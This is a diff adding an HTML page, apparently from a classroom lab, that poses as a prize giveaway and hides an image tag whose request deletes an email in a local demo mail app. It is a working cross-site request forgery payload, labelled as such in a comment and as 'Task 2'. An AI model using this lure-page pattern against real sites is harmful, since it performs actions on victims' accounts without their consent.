@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Weather Promo - You Won!</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 60px; background: #fffbeb; }
+    h1 { color: #d97706; }
+    p { color: #6b7280; }
+  </style>
+</head>
+<body>
+  <h1>🌂 You won a free umbrella!</h1>
+  <p>Congratulations! Click below to claim your prize.</p>
+
+  <!--
+    CSRF attack: browser loads this image tag and automatically
+    attaches the GoodHost session cookie to the request.
+    The user never clicked "Delete" on Port 3000.
+  -->
+  <img src="http://localhost:3000/api/emails/delete/1" style="display:none;" alt="">
+
+  <p><small>Task 2: check the Mail App - email #1 is now deleted.</small></p>
+</body>
+</html>
